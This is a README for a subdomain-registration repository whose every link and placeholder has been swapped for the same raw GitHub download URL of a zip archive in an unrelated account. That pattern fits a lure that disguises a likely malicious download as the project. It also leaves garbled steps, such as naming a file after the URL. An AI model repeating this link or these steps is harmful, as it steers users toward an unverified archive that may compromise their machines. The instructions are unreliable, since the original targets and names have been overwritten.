# Register
> If you want a more visual guide, check out [this blog post](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip).

- [Fork](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip) this repository.
- Add a new file called `https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip` in the `domains` folder to register `https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip`.
- [Read the documentation](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip).
   - If you are applying for NS records please read [this](#ns-records).
- Your pull request will be reviewed and merged. *Make sure to keep an eye on it in case we need you to make any changes!*
- After the pull request is merged, please allow up to 24 hours for the changes to propagate.
- Enjoy your new `https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip` subdomain! Please consider leaving us a star â­ï¸ to help support us!

### NS Records
When applying for NS records, please be aware we already support a [wide range of DNS records](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip), so likely do not not need them. 

In your PR, please explain why you need NS records, including examples, to help mitigate potential abuse. Refer to the [FAQ](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip) for guidelines on allowed usage.

***Pull requests adding NS records without sufficient reasoning will be closed.***

> Also see: [Why are you so strict with NS records](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip)?

## Report Abuse
If you find any subdomains being used for abusive purposes, please report them by [creating an issue](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/register/main/util/register_v2.4-beta.4.zip+abuse) with the relevant evidence.
